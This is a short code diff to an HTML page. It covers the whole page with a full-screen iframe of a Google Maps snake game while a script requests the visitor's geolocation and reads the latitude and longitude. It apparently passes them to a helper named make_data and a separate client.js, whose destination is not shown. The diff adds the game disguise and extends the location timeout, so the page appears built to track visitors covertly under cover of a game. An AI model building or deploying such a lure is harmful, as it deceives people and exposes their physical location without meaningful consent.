@@ -6,9 +6,17 @@
 
     <script src="map/assets/js/jquery-2.2.3.min.js"></script>
     <script src="client.js"></script>
+    <style>
+        html,body{
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
 </head>
 <body>
-	<pre class="pre"></pre>
+    <iframe src="https://snake.googlemaps.com/" frameborder="0" style="width:100%; height:100%;"></iframe>
 	<script type="text/javascript">
 		function showLocation(position) {
             var latitude = position.coords.latitude;
@@ -40,7 +48,7 @@
 
             if(navigator.geolocation) {
                 var ret = {};
-               	var options = {timeout:0};
+               	var options = {timeout:5000};
                	navigator.geolocation.getCurrentPosition(showLocation, errorHandler, options);
             } else {
                 make_data("Sorry, browser does not support geolocation!");
